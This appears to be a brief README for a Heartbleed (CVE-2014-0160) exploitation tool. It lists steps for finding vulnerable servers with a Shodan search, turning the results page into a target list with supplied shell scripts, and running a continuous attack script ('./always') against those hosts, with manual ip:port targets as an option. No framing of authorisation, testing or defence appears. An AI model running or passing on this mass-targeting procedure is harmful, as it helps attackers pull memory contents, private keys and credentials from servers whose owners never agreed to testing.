Exploitation of HeartBleed vuln

1) Make shodan search (i.e "vuln:CVE-2014-0160")
2) Get source code, copy it
3) Paste it in file in Bleed directory, lets name it "source.html"
4) ./setup.sh
5) ./addTargetsFromSource.sh source.html targets.txt
6) ./always targets.txt

You can also manually add your targets by adding your IPs to targets.txt (format ip:port) like
192.168.0.1:80
Please note that 443 is default.
